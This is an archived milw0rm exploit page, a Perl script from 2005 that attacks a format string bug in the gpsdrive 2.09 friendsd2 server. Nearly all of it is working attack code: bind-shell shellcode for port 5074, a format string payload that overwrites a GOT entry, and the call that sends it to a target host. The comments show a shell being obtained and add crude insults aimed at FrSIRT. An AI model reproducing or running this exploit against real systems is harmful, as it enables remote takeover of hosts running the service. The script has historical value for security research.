<html><head><title>gpsdrive <= 2.09 (friendsd2) Remote Format String Exploit (x86)</title></head><pre>#!/usr/bin/perl -w
# 
# Code by KF, although it is most likely ripped from John H. 
#  (kf_lists[at]digital_munition[dot]com)
#
# http://www.digitalmunition.com
#
# FrSIRT 24/24 &amp; 7/7 - Centre de Recherche on Donkey Testicles.
# Free 14 day Testicle licking trial available!
#
# friendsd.c:367:   fprintf (stderr, txt);
#
# Tested on intel using gpsdrive_2.09-2_i386.deb
# 
# kfinisterre@animosity:~$ telnet localhost 5074
# Trying 127.0.0.1...
# Connected to animosity
# Escape character is '^]'.
# id;
# uid=1000(kfinisterre) gid=1000(kfinisterre) groups=1000(kfinisterre)
# : command not found
#
# s0t4ipv6@Shellcode.com.ar
# x86 portbind a shell in port 5074
# 92 bytes.
# 
# This shit is NOT robust and most likely will NOT work on kernel 2.6.12 
# because of the random address space. Find your own damn pointers to overwrite
#
$shellcode  = &quot;\x90&quot; x 2 . 
&quot;\x31\xc0&quot; .			# xorl		%eax,%eax
&quot;\x50&quot; .			# pushl	%eax
&quot;\x40&quot; .			# incl		%eax
&quot;\x89\xc3&quot; .			# movl		%eax,%ebx
&quot;\x50&quot; .			# pushl	%eax
&quot;\x40&quot; .			# incl		%eax
&quot;\x50&quot; .			# pushl	%eax
&quot;\x89\xe1&quot; .			# movl		%esp,%ecx
&quot;\xb0\x66&quot; .			# movb		$0x66,%al
&quot;\xcd\x80&quot; .			# int		$0x80
&quot;\x31\xd2&quot; .			# xorl		%edx,%edx
&quot;\x52&quot; .			# pushl	%edx
&quot;\x66\x68\x13\xd2&quot; .		# pushw	$0xd213
&quot;\x43&quot; .			# incl		%ebx
&quot;\x66\x53&quot; .			# pushw	%bx
&quot;\x89\xe1&quot; .			# movl		%esp,%ecx
&quot;\x6a\x10&quot; .			# pushl	$0x10
&quot;\x51&quot; .			# pushl	%ecx
&quot;\x50&quot; .			# pushl	%eax
&quot;\x89\xe1&quot; .			# movl		%esp,%ecx
&quot;\xb0\x66&quot; .			# movb		$0x66,%al
&quot;\xcd\x80&quot; .			# int		$0x80
&quot;\x40&quot; .			# incl		%eax
&quot;\x89\x44\x24\x04&quot; .		# movl		%eax,0x4(%esp,1)
&quot;\x43&quot; .			# incl		%ebx
&quot;\x43&quot; .			# incl		%ebx
&quot;\xb0\x66&quot; .			# movb		$0x66,%al
&quot;\xcd\x80&quot; .			# int		$0x80
&quot;\x83\xc4\x0c&quot; .		# addl		$0xc,%esp
&quot;\x52&quot; .			# pushl	%edx
&quot;\x52&quot; .			# pushl	%edx
&quot;\x43&quot; .			# incl		%ebx
&quot;\xb0\x66&quot; .			# movb		$0x66,%al
&quot;\xcd\x80&quot; .			# int		$0x80
&quot;\x93&quot; .			# xchgl	%eax,%ebx
&quot;\x89\xd1&quot; .			# movl		%edx,%ecx
&quot;\xb0\x3f&quot; .			# movb		$0x3f,%al
&quot;\xcd\x80&quot; .			# int		$0x80
&quot;\x41&quot; .			# incl		%ecx
&quot;\x80\xf9\x03&quot; .		# cmpb		$0x3,%cl
&quot;\x75\xf6&quot; .			# jnz		&lt;shellcode+0x40&gt;
&quot;\x52&quot; .			# pushl	%edx
&quot;\x68\x6e\x2f\x73\x68&quot; .	# pushl	$0x68732f6e
&quot;\x68\x2f\x2f\x62\x69&quot; .	# pushl	$0x69622f2f
&quot;\x89\xe3&quot; .			# movl		%esp,%ebx
&quot;\x52&quot; .			# pushl	%edx
&quot;\x53&quot; .			# pushl	%ebx
&quot;\x89\xe1&quot; .			# movl		%esp,%ecx
&quot;\xb0\x0b&quot; .			# movb		$0xb,%al
&quot;\xcd\x80&quot;;			# int		$0x80

use Net::Friends;
use Data::Dumper;

$name = 'GPSDRIVE-aaaa';

# 0804bb84 R_386_JUMP_SLOT   recvfrom
$addy  = &quot;\x86\xbb\x04\x08&quot;;  # This is the write address. 
$addy2 = &quot;\x84\xbb\x04\x08&quot;; 

#$retaddr = 0xbfffba7c;  # Retaddr when using gdb 
$retaddr = 0xbfffba8a;  # Retaddr when NOT using gdb. Its that same kick you in the face styleee from the ppc sploit. 

$lo = ($retaddr &gt;&gt; 0) &amp; 0xffff;
$hi = ($retaddr &gt;&gt; 16) &amp; 0xffff;
		
$hi = $hi - 0x4c;
$lo = (0x10000 + $lo) - $hi - 0x4c;		

$hi =1; $lo =1;

$dir = &quot;$addy$addy2%.&quot; . $hi . &quot;d%379\$x%.&quot; . $lo . &quot;d%380\$x$shellcode&quot;;

$friends = Net::Friends-&gt;new(shift || 'localhost');
$friends-&gt;report(name =&gt; $name, lat =&gt; '1111', lon =&gt; '2222', speed =&gt; '3333', dir =&gt; $dir);

print Dumper($friends-&gt;query);

# P.S. - I fart in the general direction of Fr-Sirt. 

# milw0rm.com [2005-11-04]</pre></html>